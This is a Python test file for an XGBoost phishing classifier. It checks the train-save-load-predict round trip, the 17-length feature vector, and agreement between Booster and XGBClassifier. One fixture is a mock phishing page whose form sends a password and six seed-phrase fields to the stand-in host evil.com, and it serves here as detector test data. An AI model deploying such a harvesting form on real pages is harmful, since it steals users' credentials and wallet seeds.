"""Test the full ML pipeline: train → save → load → predict.

Ensures the training script produces models that load correctly in the
production PhishingClassifier (which uses xgb.Booster, not XGBClassifier).
"""
from __future__ import annotations

import numpy as np
import xgboost as xgb

from src.ml.classifier import PhishingClassifier
from src.ml.features import extract_features


class TestMLRoundtrip:
    def test_train_save_load_predict(self, tmp_path):
        """Train a tiny model and verify it loads in the production classifier."""
        phishing_html = (
            "<html><body>"
            '<form method="POST" action="https://evil.com">'
            '<input type="password" name="pw">'
            '<input type="text" name="seed1">'
            '<input type="text" name="seed2">'
            '<input type="text" name="seed3">'
            '<input type="text" name="seed4">'
            '<input type="text" name="seed5">'
            '<input type="text" name="seed6">'
            "</form>"
            "<script>document.write(unescape('test'));</script>"
            "</body></html>"
        )
        clean_html = (
            "<html><head><title>My Arweave Blog Post</title></head>"
            "<body><p>Hello world, this is a legitimate blog post.</p></body></html>"
        )

        phishing_features = extract_features(phishing_html).to_vector()
        clean_features = extract_features(clean_html).to_vector()

        # Need at least 2 samples per class for XGBClassifier
        X = np.array([phishing_features, phishing_features, clean_features, clean_features])
        y = np.array([1, 1, 0, 0])

        # Train with XGBClassifier (same as training/train.py)
        model = xgb.XGBClassifier(
            n_estimators=10,
            max_depth=2,
            eval_metric="logloss",
        )
        model.fit(X, y)

        # Save with XGBClassifier.save_model (same as training/train.py)
        model_path = str(tmp_path / "test_model.pkl")
        model.save_model(model_path)

        # Load in production format (Booster via PhishingClassifier)
        classifier = PhishingClassifier(model_path)

        # Predict on phishing sample
        score = classifier.predict_score(extract_features(phishing_html))
        assert isinstance(score, float)
        assert 0.0 <= score <= 1.0

        # Predict on clean sample
        clean_score = classifier.predict_score(extract_features(clean_html))
        assert isinstance(clean_score, float)
        assert 0.0 <= clean_score <= 1.0

        # Phishing should score higher than clean
        assert score > clean_score

    def test_feature_vector_always_17(self):
        """Verify feature vector length is always 17 regardless of input."""
        samples = [
            "<html><body><p>test</p></body></html>",
            "<html><body></body></html>",
            "",
            '<html><body><form><input type="password"></form></body></html>',
        ]
        for html in samples:
            features = extract_features(html)
            vector = features.to_vector()
            assert len(vector) == 17
            for v in vector:
                assert isinstance(v, (int, float, bool))

    def test_booster_and_classifier_produce_same_score(self, tmp_path):
        """Verify Booster and XGBClassifier produce identical predictions."""
        html = '<html><body><form action="https://x.com"><input type="password"></form></body></html>'
        features = extract_features(html).to_vector()

        X = np.array([features, features, [0] * 17, [0] * 17])
        y = np.array([1, 1, 0, 0])

        model = xgb.XGBClassifier(n_estimators=5, max_depth=2, eval_metric="logloss")
        model.fit(X, y)

        model_path = str(tmp_path / "model.pkl")
        model.save_model(model_path)

        # XGBClassifier prediction
        classifier_proba = model.predict_proba(np.array([features]))[0][1]

        # Booster prediction (production path)
        booster = xgb.Booster()
        booster.load_model(model_path)
        dmat = xgb.DMatrix(np.array([features]))
        booster_score = float(booster.predict(dmat)[0])

        # Should be very close (floating point)
        assert abs(classifier_proba - booster_score) < 0.001
